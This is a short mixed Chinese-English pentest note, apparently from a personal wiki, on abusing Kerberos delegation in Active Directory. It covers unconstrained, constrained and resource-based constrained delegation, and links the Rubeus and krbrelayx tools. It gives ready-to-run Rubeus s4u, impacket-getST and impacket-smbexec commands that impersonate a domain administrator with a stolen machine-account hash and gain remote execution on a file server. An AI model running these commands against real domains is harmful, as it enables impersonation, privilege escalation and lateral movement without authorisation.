# kerberos delegation

Microsoft released several implementations of this including _unconstrained delegation_ (in 2000), _constrained delegation_ (in 2003), and _resource based constrained delegation_ (in 2012).&#x20;

为了克服kerberos  double-hop的缺点

#### Unconstrained Delegation

用户给中间服务器的凭据可以被窃取用来登任意服务器

When the user requests access for a service ticket against a service that uses unconstrained delegation, the request also includes a forwardable TGT

{% embed url="https://github.com/GhostPack/Rubeus" %}

{% embed url="https://github.com/dirkjanm/krbrelayx" %}

#### Constrained Delegation

中间人的属性里有哪些后端可以委派，调整这个属性需要高权限，域控权限

rubeus or kekeo

.\Rubeus.exe s4u /user:web01$ /rc4:46f5e45ca3d9e510adf06f3296a06fa2 /impersonateuser:administrator /msdsspn:cifs/file01 /ptt



impacket-getST -spn cifs/file01 -impersonate administrator -hashes :46f5e45ca3d9e510adf06f3296a06fa2 'evil.com/web01$'

export KRB5CCNAME=administrator.ccache

impacket-smbexec -no-pass -k file01.evil.com

#### Resource-Based Constrained Delegation

为了消除这个高权限，转而变成后端具有属性里有些哪些中间人可以代表他人、这样只需要最终目标的管理员权限就可以了,或者说某个已控制的用户有genetic write的权限，非域管理员权限，这是一个优点。

要写入的属性是spn，

所以中间人必须要有一个spn，所以要么用已有的要么创建一个新的computeraccount/serviceaccount。

那么我们就用我们的中间人去申请目标的本地管理员

